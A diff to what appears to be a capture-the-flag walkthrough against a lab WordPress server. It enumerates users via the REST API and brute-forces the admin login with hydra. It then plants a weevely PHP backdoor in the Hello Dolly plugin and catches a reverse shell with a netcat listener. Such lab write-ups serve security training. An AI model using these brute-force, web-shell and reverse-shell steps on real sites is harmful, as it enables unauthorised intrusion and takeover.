@@ -70,7 +70,7 @@ _______________________________________________________________
 ```
 
 No plugins are installed, no exploits found... but we did see something very interesting in the output:
-the Wordpress API is opened for us :D we can see what users exist http://10.0.2.9:8000/wp-json/wp/v2/users
+the Wordpress API is opened for us :D we can see what users exist `http://<dockervmip>:8000/wp-json/wp/v2/users`
 there is only one user called "bob" chances are close to 100% that he is the admin user.
 
 Since we have no exploits available, and we know the username, we can try a bruteforce attack
@@ -89,9 +89,11 @@ hydra 10.0.2.9 -V -l bob -P /root/Downloads/10k_most_common.txt http-get-form "/
 
 The password is Welcome1
 
-edit the dolly plugin to create a php shell (google it) to your own pc and setup a listener
+edit the dolly plugin to create a php shell with weevely (`weevely generate awesomepassword /home/weevely/backdoor/totallynotabackdoor.php` then copy the contents of the file into dolly and change the parameters with your ip and port you want to use) and setup a listener.
 
 `nc -lvp 44444`
+
+browse to the website and the shell will be opened
 
 -------------------
 
